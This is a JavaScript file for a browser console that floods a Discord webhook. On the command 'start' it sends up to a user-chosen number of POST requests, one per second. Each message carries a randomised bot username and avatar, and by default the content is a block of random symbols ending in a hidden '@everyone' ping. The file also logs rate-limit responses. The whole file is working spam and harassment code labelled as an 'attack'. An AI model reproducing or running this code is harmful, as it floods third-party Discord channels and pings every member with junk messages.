const consoleInput = document.querySelector(".consoleInput");

consoleInput.addEventListener("keypress", function(event) {
if (event.key === "Enter") {
    event.preventDefault();
    document.querySelector(".hiddenButton").click();
}
});

function consoleContent(content) {
    const d = new Date();
    let h = d.getHours();
    let m = d.getMinutes();
    let s = d.getSeconds();
    let time = h + ":" + m + ":" + s;
    
    const node = document.createElement("li");
    const textnode = document.createTextNode(`[${time}] - ${content}`);
    node.appendChild(textnode);
    document.getElementById("consoleInfo").appendChild(node);
}

function startConsole() {
    let consoleCommand = document.querySelector(".consoleInput").value;

    if(consoleCommand == "start") {
        consoleContent('Attack has started!');
        startAttack();
    } else if(consoleCommand == "stop") {
        consoleContent('Attack has stopped!');
    } else {
        consoleContent(`Command '${consoleCommand}' not found!`);
    }
}

function startAttack() {
    let webhook = document.querySelectorAll(".infoInput")[0].value;
    let username = document.querySelectorAll(".infoInput")[1].value;
    let avatar = document.querySelectorAll(".infoInput")[2].value;
    let message = document.querySelectorAll(".infoInput")[3].value;
    let numOfMessage = document.querySelectorAll(".infoInput")[4].value;

    let cifra = 1000;
    for(let i = 1; i <= numOfMessage; i++) {
        setTimeout(function timer() {
            const req = new XMLHttpRequest();
            req.responseType = 'text';

            function Avatar() {
                if(avatar == null || avatar == '') {
                    let randImg = Math.floor(Math.random() * 999);
                    return `https://picsum.photos/id/${randImg}/1000`;
                } else {
                    avatar = avatar;
                    return avatar;
                }
            }

            function Message() {
                if(message == null || message == '') {
                    let randMess = '```'
                    for(let j = 0; j <= 1000; j += 1) {
                        let txt = '※‗♪µ±‾¸⁋¯~⁓º‖⁜⁁!⁘*℃°§‛℗©}×-)₥௹௹૱₦﷼₱₯ååÃ⨌⨒⨔⨤⨡⨬ԬԩӺђꚀЀꚄӁЄЄҋԞӃ(*/ω＼*)(╯°□°）╯︵ ┻━┻';
                        let rMessage = txt.charAt(Math.floor(Math.random() * txt.length));
                        randMess += rMessage;
                    }
                    randMess += '``` ||@everyone||';
                    return randMess;
                } else {
                    message = message;
                    return message;
                }
            }

            function randUsername(uLength) {
                if(username == null || username == '') {
                    username = 'strBot';
                } else {
                    username = username;
                }
                let nastavak = `${username}_`;
                for(let j = 0; j <= uLength; j += 1) {
                    let txt = 'abcdefghijklomnprstuvzqwyx1234567890ABCDEFGHIJKLOPRSTUVZWQYX';
                    let rand = txt.charAt(Math.floor(Math.random() * txt.length));
                    nastavak += rand;
                }
                return nastavak;
            }

            req.open("POST", webhook);
            req.setRequestHeader('Content-type', 'application/json');

            const params = {
                username: randUsername(9),
                avatar_url: Avatar(),
                content: Message()
            }

            req.send(JSON.stringify(params));
            req.onload = () => {
                if(req.status == 204) {
                    consoleContent(`${randUsername(9)} je poslao poruku!`);
                } else if(req.status == 429) {
                    consoleContent(`RATE-LIMIT -> ${randUsername(9)} je blokiran!`);
                } else {
                    consoleContent(`Nešto je pošlo po krivom!`);
                }
            }
        }, i * cifra);
    }
}
